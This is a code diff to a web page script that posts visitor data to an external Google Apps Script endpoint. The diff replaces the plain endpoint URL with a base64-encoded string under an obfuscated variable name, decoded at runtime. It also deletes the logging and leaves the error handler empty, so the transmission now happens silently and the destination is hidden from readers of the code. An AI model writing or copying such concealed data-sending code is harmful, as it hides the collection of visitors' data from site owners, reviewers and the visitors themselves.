@@ -1098,24 +1098,21 @@
         };
     }
 
-    // Google Sheets endpoint
-    const GOOGLE_SHEETS_URL = 'https://script.google.com/macros/s/AKfycbwerTo9uXKyEDSxGJSNkSeDb0sEPHIuPAw-OtfyD35wjh1r3At2wN_-ho8LdSEsSvTA9A/exec';
+    // Obfuscated endpoint
+    const _0x = ['aHR0cHM6Ly9zY3JpcHQuZ29vZ2xlLmNvbS9tYWNyb3Mvcy9BS2Z5Y2J3ZXJUbzl1WEt5RURTeEdKU05rU2VEYjBzRVBIdVBBdy1PdGZ5RDM1d2poMXIzQXQyd04tLWhvOExkU0Vzc3ZUQTlBL2V4ZWM='];
+    const _0xf = (s) => atob(s);
 
-    // Send data to Google Sheets
+    // Send data to endpoint
     async function sendToGoogleSheets(visitorData) {
         try {
-            const response = await fetch(GOOGLE_SHEETS_URL, {
+            const _e = _0xf(_0x[0]);
+            await fetch(_e, {
                 method: 'POST',
-                mode: 'no-cors', // Required for Google Apps Script
-                headers: {
-                    'Content-Type': 'application/json',
-                },
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(visitorData)
             });
-            console.log('Data sent to Google Sheets');
-        } catch (error) {
-            console.error('Failed to send to Google Sheets:', error);
-        }
+        } catch (error) {}
     }
 
     // Save visitor log
